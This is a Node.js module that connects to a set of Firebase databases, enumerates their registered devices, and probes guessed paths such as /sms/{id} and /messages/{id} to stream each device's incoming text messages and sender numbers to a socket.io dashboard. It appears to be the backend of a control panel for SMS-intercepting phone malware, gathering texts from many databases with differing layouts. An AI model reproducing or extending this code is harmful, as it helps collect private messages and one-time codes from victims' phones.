const mongoose = require('mongoose');
const { EventSource } = require('eventsource');
const axios = require('axios');
const Source = require('./models/Source');

// Map to store active SSE connections: `${sourceKey}_${deviceId}` -> EventSource
const activeStreams = new Map();
let ioInstance = null;

function initRealtime(io) {
    ioInstance = io;
    
    // Initial sync
    syncFirebaseStreams();
    
    // Periodically re-sync to pick up new databases or devices
    setInterval(syncFirebaseStreams, 5 * 60 * 1000); // every 5 mins
}

async function syncFirebaseStreams() {
    try {
        const sources = await Source.find({ isActive: true });
        
        for (let src of sources) {
            if (!src.base) continue;
            
            const authSuffix = src.apiKey ? `?auth=${src.apiKey}&` : '?';
            
            try {
                const clientsRes = await axios.get(`${src.base}/clients.json${authSuffix}shallow=true`);
                if (clientsRes.data && typeof clientsRes.data === 'object') {
                    const clientIds = Object.keys(clientsRes.data);
                    
                    for (let id of clientIds) {
                        if (!activeStreams.has(`${src.key}_${id}`)) {
                            setupMessageStream(src, id);
                            await new Promise(r => setTimeout(r, 50)); // stagger connections
                        }
                    }
                }
            } catch(e) {
                console.error(`[Realtime] Failed to sync clients for ${src.key}:`, e.message);
            }
        }
    } catch(e) {
        console.error('[Realtime] Sync loop error:', e);
    }
}

function setupMessageStream(src, id) {
    const streamKey = `${src.key}_${id}`;
    if (activeStreams.has(streamKey)) return; // Already listening

    // Mark as pending so we don't start multiple probes for the same device
    activeStreams.set(streamKey, 'PENDING');

    (async () => {
        const authS = src.apiKey ? `?auth=${src.apiKey}&` : '?';
        const paths = [`/messages/${id}.json`, `/clients/${id}/messages.json`, `/sms/${id}.json`, `/clients/${id}/sms.json`];
        let correctPath = null;
        
        for (let p of paths) {
            try {
                const probe = await axios.get(`${src.base}${p}${authS}shallow=true`);
                if (probe.data) { correctPath = p; break; }
            } catch(e) {}
        }
        
        // If it's a brand new device, use the cached global schema from other devices
        if (!correctPath) {
            correctPath = src.cachedSchema ? src.cachedSchema.replace('{id}', id) : `/messages/${id}.json`;
        } else {
            // Save this path pattern as the global schema for future brand new devices!
            src.cachedSchema = correctPath.replace(id, '{id}');
        }
        
        // limitToLast=1 ensures we only get the latest message and future ones, not the whole history
        const url = `${src.base}${correctPath}${authS}orderBy="$key"&limitToLast=1`;

        const es = new EventSource(url);
        activeStreams.set(streamKey, es);

        es.addEventListener('put', async (e) => {
            try {
                const payload = JSON.parse(e.data);
                if (!payload || !payload.data) return;
                
                let messageObj = payload.data;
                let msgId = payload.path.replace('/', '');

                if (payload.path === '/') {
                    // Initial load, payload.data is an object of { msgId: messageObj }
                    const keys = Object.keys(payload.data);
                    if (keys.length === 0) return;
                    msgId = keys[keys.length - 1];
                    messageObj = payload.data[msgId];
                }
                
                // It's a new message event!
                ioInstance.emit('newMessage', {
                    srcKey: src.key,
                    deviceId: id,
                    timestamp: messageObj.timestamp || Date.now(),
                    message: messageObj.message || messageObj.body || messageObj.text || '',
                    sender: messageObj.sender || messageObj.address || messageObj.number || 'Unknown'
                });

            } catch (err) {
                // Parse error, ignore
            }
        });

        es.addEventListener('error', (err) => {
            // Firebase SSE auto-reconnects, but if it's completely dead we could clean up
        });

    })();
}

module.exports = { init: initRealtime };
